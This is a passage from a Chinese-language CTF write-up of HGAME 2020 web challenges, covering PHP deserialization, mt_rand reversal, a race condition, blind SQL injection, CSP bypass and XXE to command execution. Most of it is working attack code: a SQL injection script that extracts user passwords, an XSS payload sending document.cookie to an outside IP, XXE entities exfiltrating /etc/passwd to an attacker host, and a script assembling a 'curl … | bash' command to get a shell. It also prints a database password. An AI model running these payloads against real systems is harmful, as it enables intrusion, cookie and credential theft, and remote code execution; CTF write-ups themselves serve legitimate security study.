<p>可以反序列化后,我们发现<code>Fight</code>的<code>__destruct</code>方法可以修改<code>$_SESSION[&#39;rank&#39;]</code></p>
<pre><code class="php">public function __destruct(){
        // 确保程序是跑在服务器上的！
        $this-&gt;serverKey = $_SERVER[&#39;key&#39;];
        if($this-&gt;key === $this-&gt;serverKey){
            $_SESSION[&#39;rank&#39;] = $this-&gt;rank;
        }else{
            // 非正常访问
            session_start();
            session_destroy();
            setcookie(&#39;monster&#39;, &#39;&#39;);
            header(&#39;Location: index.php&#39;);
            exit;
        }
    }</code></pre>
<p>但是还有<code>$this-&gt;key === $this-&gt;serverKey</code>阻挠这我们</p>
<p>如果我们能获得或修改<code>$_SERVER[&#39;key&#39;]</code>,便可以拿到flag了</p>
<p>php反序列化有个特性,反序列化时,若对象没有某个值,便会恢复成该对象对应的类的默认值</p>
<p>如:</p>
<pre><code class="php">&lt;?php
class test{
    public $my_static = &#39;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#39;;
    public function __destruct()
    {
        echo $this-&gt;my_static;
    }

}
class tesa{

}
$a=str_replace(&quot;tesa&quot;,&quot;test&quot;,serialize(new tesa()));
unserialize($a);


结果:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</code></pre>
<p>于是构造</p>
<pre><code class="php">&lt;?php
class Game
{
    private $encryptKey = &#39;gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL&#39;;
    public $welcomeMsg = &#39;%s, Welcome to Ordinal Scale!&#39;;

    public $sign = &#39;&#39;;
    public $rank;
//secret:gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL
    public function __construct($playerName){
        $_SESSION[&#39;player&#39;] = $playerName;
        if(!isset($_SESSION[&#39;exp&#39;])){
            $_SESSION[&#39;exp&#39;] = 0;
        }
        $data = [$playerName, $this-&gt;encryptKey];
        $this-&gt;init($data);//set sign
    }

    private function init($data){
        foreach($data as $key =&gt; $value){
            $this-&gt;welcomeMsg = sprintf($this-&gt;welcomeMsg, $value);
            $this-&gt;sign .= md5($this-&gt;sign . $value);
        }
    }
}
class Rank
{
    private $rank;
//    private $serverKey;     // 服务器的 Key
//    private $key;

    public function __construct()
    {
        $this-&gt;rank=1;
    }

    public function __destruct(){

    }
}
$s=new Rank();
//$s=array(&#39;name&#39;=&gt;&#39;蔡建斌&#39;,&#39;no&#39;=&gt;999999999999999999);
$a=new Game($_GET[&#39;name&#39;]);
$sign = md5(serialize($s) . $a-&gt;sign);
print( base64_encode(serialize($s) . $sign));
?&gt;
</code></pre>
<h3 id="二发入魂"><a href="#二发入魂" class="headerlink" title="二发入魂"></a>二发入魂</h3><p>刚看到这题时是有点懵的,网页的图片是妙蛙种子,是想说交种子上去,但我没看懂/////</p>
<p>前一段时间爆出来的mt_srand逆向刚好可以用到</p>
<p> <a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a> </p>
<pre><code class="php">import requests
import os

burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/random.php?times=230&quot;
burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
result=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies).text

a=eval(result)
p = os.popen(&quot;python reverse_mt_rand.py %d %d 0 0&quot; % (a[0],a[227]) )
x=p.read().strip()

burp0_url = &quot;https://twoshot.hgame.n3ko.co:443/verify.php&quot;
burp0_cookies = {&quot;PHPSESSID&quot;: &quot;quh0vrim4vv8p4mnro1migluh3&quot;}
burp0_headers = {&quot;Connection&quot;: &quot;close&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;https://twoshot.hgame.n3ko.co&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-origin&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Referer&quot;: &quot;https://twoshot.hgame.n3ko.co/&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;}
burp0_data = {&quot;ans&quot;: x}
print(burp0_data)
result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
print(result)
</code></pre>
<h3 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>弱密码登陆别人账号,直接抄作业</p>
<p>admin,123456</p>
<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>条件竞争</p>
<p>在一次偶然的爆破中我发现,商品的数量多了,于是便猜测有条件竞争漏洞</p>
<p>我来模拟以下造成条件竞争漏洞的原因</p>
<p>首先猜测以下solve和buy方法的流程</p>
<pre><code class="php">function solve()
{
    #1. $num=从数据库中查找要用户持有的卖出商品的个数
    #2. 如果数量足够,则进行下一步,否则返回并报错
    #3. 在数据库中增加用户账户里的钱
    #4. 在数据库中减少用户拥有该商品的数量
}</code></pre>
<p>假设web服务器在相差一个步骤的时间时收到两个请求,此时fork出两个进程a,b,设此时商品数量为1,两个请求要卖出的数量也都为1</p>
<ol>
<li>a 执行完步骤1(<code>$num=1</code>);b刚要开始执行步骤1</li>
<li>a执行完步骤二;b执行完步骤一(<code>$num=1</code>)</li>
<li>a执行步骤三,用户账户里的钱增加了;b执行完步骤二,b进程也满足条件</li>
<li>a执行步骤四,此时数据库中商品的数量为0,b执行完步骤三,用户账户里的钱增加了</li>
<li>a进程结束;b进程试图减少数据库中商品的数量,但是数量最小为0,操作失败</li>
<li>b进程结束</li>
</ol>
<p>于是我们可以看到最终结果是,用户用1单位的商品卖出了两个单位商品的价钱(1个商品被卖了两次)</p>
<p>为啥会这样,这是同时操作一个数据导致的bug,这也是为啥计算机里经常出现锁这个名称的原因,给数据上锁,避免两个进程同时操作一个数据,导致bug</p>
<p>刷钱脚本</p>
<pre><code class="python">from multiprocessing import Pool
import requests
def buy(num,loop=3):

    for i in range(loop):
        burp0_url = &quot;http://121.36.88.65:9999/API/?method=buy&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if &quot;success&quot; in result:
            print(&quot;successfully buy %d items&quot; % num)


def solve(num,loop=3):

    for i in range(loop):
        burp0_url = &quot;http://121.36.88.65:9999/API/?method=solve&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;gd44lbha3t9ltc1cgng5c755ni&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Accept&quot;: &quot;*/*&quot;, &quot;X-Requested-With&quot;: &quot;XMLHttpRequest&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded; charset=UTF-8&quot;, &quot;Origin&quot;: &quot;http://121.36.88.65:9999&quot;, &quot;Referer&quot;: &quot;http://121.36.88.65:9999/market.html&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;code&quot;: &quot;800001&quot;, &quot;amount&quot;: num}
        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text
        if &quot;success&quot; in result:
            print(&quot;successfully solve %d items&quot; % num)

if __name__==&#39;__main__&#39;:
    i=0
    while True:
        p = Pool(100)
        num=500
        for i in range(100):
            p.apply_async(buy, args=(num,))
        print(&#39;Waiting for all buy subprocesses done...&#39;)
        p.close()
        p.join()
        print(&#39;All subprocesses done.&#39;)

        p = Pool(100)

        for i in range(100):
            p.apply_async(solve, args=(num,))
        print(&#39;Waiting for all solve subprocesses done...&#39;)
        p.close()
        p.join()
        print(&#39;All subprocesses done.&#39;)
</code></pre>
<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p>
<pre><code class="python">allow: [&#39;0&#39;, &#39;1&#39;, &#39;2&#39;, &#39;3&#39;, &#39;4&#39;, &#39;5&#39;, &#39;6&#39;, &#39;7&#39;, &#39;8&#39;, &#39;9&#39;, &#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;, &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, 
&#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;, &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;, &#39;_&#39;, &#39;\n&#39;]
disable: [&#39;!&#39;, &#39;&quot;&#39;, &#39;#&#39;, &#39;$&#39;, &#39;%&#39;, &#39;&amp;&#39;, &quot;&#39;&quot;, &#39;(&#39;, &#39;)&#39;, &#39;*&#39;, &#39;+&#39;, &#39;,&#39;, &#39;-&#39;, &#39;.&#39;, &#39;/&#39;, &#39;:&#39;, &#39;;&#39;, &#39;&lt;&#39;, &#39;=&#39;, &#39;&gt;&#39;, &#39;?&#39;, &#39;@&#39;, &#39;[&#39;, &#39;\\&#39;, &#39;]&#39;, &#39;^&#39;, &#39;`&#39;, &#39;{&#39;, &#39;|&#39;, &#39;}&#39;, &#39;~&#39;, &#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\x0b&#39;, &#39;\x0c&#39;]</code></pre>
<p>一个个检测输入点发现,delete方法存在sql注入</p>
<p>注入脚本</p>
<pre><code class="python">import requests
from bs4 import BeautifulSoup
def send():

    burp0_url = &quot;http://139.199.182.61:19999/index.php?method=send&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    burp0_data = {&quot;message&quot;: &quot;aaa&quot;}
    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if res.status_code==200:
        return 1
    else :
        return 0

def get_id():


    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    html = res.text
    try :
        soup = BeautifulSoup(html,&#39;html.parser&#39;) #把网页解析为BeautifulSoup对象
        url=soup.find(&quot;span&quot;,class_=&quot;message&quot;).find(&quot;a&quot;)[&#39;href&#39;]
    except:
        return False
    return url.replace(&quot;index.php?method=delete&amp;delete_id=&quot;,&quot;&quot;)


def check(mesid):
    burp0_url = &quot;http://139.199.182.61:19999/index.php?message=aaa&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://139.199.182.61:19999&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    url=&quot;index.php?method=delete&amp;delete_id=&quot;+str(mesid)
    if url in res.text:
        return True
    return False
#index.php?method=delete&amp;delete_id=6594

def delete(mesid):
    burp0_url = &quot;http://139.199.182.61:19999/index.php&quot;
    burp0_cookies = {&quot;PHPSESSID&quot;: &quot;ab5fgepp50bnaenppkju4md4qs&quot;}
    burp0_headers = {&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://139.199.182.61:19999/index.php&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
    requests.get(burp0_url, params={&quot;method&quot;:&quot;delete&quot;,&quot;delete_id&quot;:mesid},headers=burp0_headers, cookies=burp0_cookies)


def sql_inj(sql):
    mesid=get_id()
    delete(str(mesid)+&quot; and (&quot;+sql+&quot;) #&quot;)
    if not check(mesid):
        print(&quot;%s success&quot; % sql)
        send()
        return True
    print(&quot;%s fail&quot; % sql)
    return False

# sql_inj(&quot;(select substr(hex(&#39;1&#39;),1,1))=&#39;3&#39;&quot;)
cha=&quot;0123456789ABCDEF&quot;
result=&quot;&quot;
p=0
while True:
    p+=1
    temp=&#39;&#39;
    for i in cha:
        if sql_inj(&quot;(select substr(hex(group_concat(name,&#39;,&#39;,password)),%d,1) FROM user where id=1)=&#39;%s&#39;&quot; % (p,i) ):
            result+=i
            temp=i
            print(result)
            break
    if temp!=result[-1]:
        break

#information_schema,babysql
#messages,user
#id,name,password
</code></pre>
<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p>
<p>存在csp:</p>
<pre><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></pre><p>先检测一下</p>
<p> <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p>
<p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p>
<p>说object-src不安全</p>
<p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p>
<p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p>
<p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p>
<p>我们发送以下payload(用script标签也一样)</p>
<pre><code>&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</code></pre><p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p>
<p>因为没有设置<code>object-src</code>我们可以用<code>embed</code>标签带回数据</p>
<p>最后的payload</p>
<pre><code>&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;
var+iframe+%3d+eval(%22document.create\105lement(&#39;embed&#39;)%22)%3b
iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b
eval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</code></pre><p><code>hgame{1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.}</code></p>
<h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p>
<pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE r [
&lt;!ELEMENT r ANY &gt;
&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
%sp;
%param1;
]&gt;
&lt;r&gt;&amp;exfil;&lt;/r&gt;

File stored on http://39.108.164.219/evil.xml
&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><p>submit.php</p>
<pre><code class="php">&lt;?php
include &quot;config.php&quot;;
$result = null;
libxml_disable_entity_loader(false);
$xmlfile = file_get_contents(&#39;php://input&#39;);

try{
    $stmt = $conn-&gt;prepare(&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;);
    $stmt-&gt;bindParam(&#39;:id&#39;, $id);
    $stmt-&gt;bindParam(&#39;:chal_name&#39;, $chal_name);
    $stmt-&gt;bindParam(&#39;:bd_level&#39;, $level);
    $stmt-&gt;bindParam(&#39;:bd_time&#39;, $level);

    $dom = new DOMDocument();
    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
    $creds = simplexml_import_dom($dom);
    $id = $creds-&gt;id;
    $chal_name = $creds-&gt;name;
    $level = $creds-&gt;level;
    $time = $creds-&gt;time;
    if ($id == &quot;&quot; || $level == &quot;&quot; || $chal_name == &quot;&quot;|| $time == &quot;&quot;) {
        $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;请填写信息！&quot;);
        die($result);
    }
    $stmt-&gt;execute();
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,1,&quot;已提交成功，正在为您安排打手&quot;);
}catch(Exception $e){
    $result = sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;,0,&quot;提交失败！&quot;);
}
header(&#39;Content-Type: text/html; charset=utf-8&#39;);
echo $result;
?&gt;</code></pre>
<p>config.php</p>
<pre><code class="php">&lt;?php
$dbms=&#39;mysql&#39;;
$host=&#39;localhost&#39;;
$dbName=&#39;bdctr_message&#39;;
$user=&#39;root&#39;;
$pass=&#39;yevi1gcqpqHSaOZVDI1CcRLaHHSJ5BYgImof&#39;;

$dsn=&quot;$dbms:host=$host;dbname=$dbName&quot;;
$conn = new PDO($dsn, $user, $pass, array(PDO::ATTR_PERSISTENT =&gt; true));
$conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

?&gt;</code></pre>
<p>原本想着用gopher执行sql语句,但是有密码无法执行</p>
<p>我我我我是个dsb,明明知道可能是内网有可能由其他主机,但就是不试一下</p>
<pre><code>IP address       HW type     Flags       HW address            Mask     Device
172.21.0.5       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.1       0x1         0x2         02:42:f7:6e:6f:34     *        eth0
172.21.0.6       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.2       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.32      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.75      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.7       0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.76      0x1         0x2         02:42:ac:15:00:4c     *        eth0
172.21.0.30      0x1         0x0         00:00:00:00:00:00     *        eth0
172.21.0.77      0x1         0x0         00:00:00:00:00:00     *        eth0
</code></pre><pre><code>127.0.0.1    localhost
::1    localhost ip6-localhost ip6-loopback
fe00::0    ip6-localnet
ff00::0    ip6-mcastprefix
ff02::1    ip6-allnodes
ff02::2    ip6-allrouters
172.21.0.76    hgame-private
172.21.0.31    f9f1b9b99e13</code></pre><p>发现一个内网服务器<code>172.21.0.76</code></p>
<p>当尝试访问80端口时,发现文件太大等一系列问题</p>
<blockquote>
<p>使用libxml读取文件时,文件不能太大否则会报错</p>
</blockquote>
<p>于是尝试压缩能不能读取</p>
<pre><code>&lt;?php
    error_reporting(0);
    file_put_contents(&quot;tmp&quot;,base64_decode(str_replace(&#39; &#39;,&#39;+&#39;,$_GET[&#39;a&#39;])));
    $a=file_get_contents(&quot;php://filter/read=zlib.inflate/resource=tmp&quot;);
    file_put_contents(&quot;mes/&quot;.date(&quot;h_m_s&quot;).&quot;.txt&quot;,$a);
?&gt;
</code></pre><pre><code>&lt;!ENTITY % data SYSTEM &quot;php://filter/zlib.deflate/convert.base64-encode/resource=http://172.21.0.76&quot;&gt;
&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#39;http://39.108.164.219:60005/?a=%data;&#39;&gt;&quot;&gt;</code></pre><pre><code class="php">&lt;?php
error_reporting(0);

$token = @$_GET[&#39;token&#39;];
if (!isset($token)) {
    die(&quot;请带上您的队伍token访问! /?token=&quot;);
}
$api = &quot;http://checker/?token=&quot;.$token;
$t = file_get_contents($api);
if($t !== &quot;ok&quot;) {
    die(&quot;队伍token错误&quot;);
}

highlight_file(__FILE__);

$sandbox = &#39;/var/www/html/sandbox/&#39;. md5(&quot;hgame2020&quot; . $token);;
@mkdir($sandbox);
@chdir($sandbox);

$content = $_GET[&#39;v&#39;];
if (isset($content)) {
    $cmd = substr($content,0,5);
    system($cmd);
}else if (isset($_GET[&#39;r&#39;])) {
    system(&#39;rm -rf ./*&#39;);
}

/*   _____ _    _ ______ _      _        _____ ______ _______   _____ _______   _
  / ____| |  | |  ____| |    | |      / ____|  ____|__   __| |_   _|__   __| | |
 | (___ | |__| | |__  | |    | |     | |  __| |__     | |      | |    | |    | |
  \___ \|  __  |  __| | |    | |     | | |_ |  __|    | |      | |    | |    | |
  ____) | |  | | |____| |____| |____ | |__| | |____   | |     _| |_   | |    |_|
 |_____/|_|  |_|______|______|______( )_____|______|  |_|    |_____|  |_|    (_)
                                    |/

*/</code></pre>
<p>然后利用 <a href="https://err0rzz.github.io/2017/11/13/ctf命令执行与绕过/" target="_blank" rel="noopener">https://err0rzz.github.io/2017/11/13/ctf%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E7%BB%95%E8%BF%87/</a> </p>
<p>的方法来执行命令</p>
<pre><code class="php">
&lt;?php
    $a=file_get_contents(&quot;tmp.xml&quot;);
    $command=array(
    &#39;&gt;ls\\\\&#39;, 
    &#39;ls&gt;_&#39;, 
    &#39;&gt;\\ \\\\&#39;, 
    &#39;&gt;-t\\\\&#39;, 
    &#39;&gt;\\&gt;g&#39;, 
    &#39;ls&gt;&gt;_&#39;,

    &quot;&gt;bash&quot;,
    &quot;&gt;\\|\\\\&quot;,
    &quot;&gt;5\\\\&quot;,
    &quot;&gt;00\\\\&quot;,
    &quot;&gt;60\\\\&quot;,
    &quot;&gt;9:\\\\&quot;,
    &quot;&gt;21\\\\&quot;,
    &quot;&gt;4.\\\\&quot;,
    &quot;&gt;16\\\\&quot;,
    &quot;&gt;8.\\\\&quot;,
    &quot;&gt;10\\\\&quot;,
    &quot;&gt;9.\\\\&quot;,
    &quot;&gt;3\\\\&quot;,
    &quot;&gt;\\ \\\\&quot;,
    &quot;&gt;rl\\\\&quot;,
    &quot;&gt;cu\\\\&quot;
    );
    foreach($command as $v)
    {
        echo $v.&quot;\n&quot;;
        $v=urlencode($v);
        file_put_contents(&quot;evil.xml&quot;,str_replace(&quot;TGT&quot;,$v,$a));
        $postdata=&lt;&lt;&lt;MRK
&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;!DOCTYPE msg [
&lt;!ELEMENT msg ANY &gt;
&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;
%sp;
%param1;
]&gt;
&lt;msg&gt;&lt;id&gt;&amp;exfil;&lt;/id&gt;&lt;name&gt;b&lt;/name&gt;&lt;level&gt;c&lt;/level&gt;&lt;time&gt;d&lt;/time&gt;&lt;/msg&gt;
MRK;
        $opts = array(&#39;http&#39; =&gt; 
        array( &#39;method&#39;  =&gt; &#39;POST&#39;,
        &#39;header&#39;  =&gt; &#39;Content-type: application/x-www-form-urlencoded&#39;,
        &#39;content&#39; =&gt; $postdata ) 
    );
        $context = stream_context_create($opts);
        file_get_contents(&quot;http://bdctr.hgame.day-day.work/submit.php&quot;, false, $context);

    }


?&gt;
</code></pre>
<p>在经历一次rm -rf 之后,终于拿到getshell</p>
<p><img src="https://i.loli.net/2020/02/17/IDFPmldJKNhEHt7.png" alt="image26112"></p>
<p><code>hgame{XxE!@SsrF_4nD_f1lt3rEd_Rc3_1s_Co0l!}</code></p>
<h3 id="sekiro"><a href="#sekiro" class="headerlink" title="sekiro"></a>sekiro</h3><p>刚拿到题目的时候,我心态被第一题搞崩了,随便看了一下,就溜去打游戏了,看了wp,艹</p>
<p>拿到题目,是我不熟悉的nodejs</p>
<p>影响不大,看个大概就会了</p>
<p><code>\route\index.js</code></p>
<pre><code class="javascript">router.post(&#39;/action&#39;, function (req, res) {
  if (!req.session.sekiro) {
    res.end(&quot;Session required.&quot;)
  }
  if (!req.session.sekiro.alive) {
    res.end(&quot;You dead.&quot;)
  }
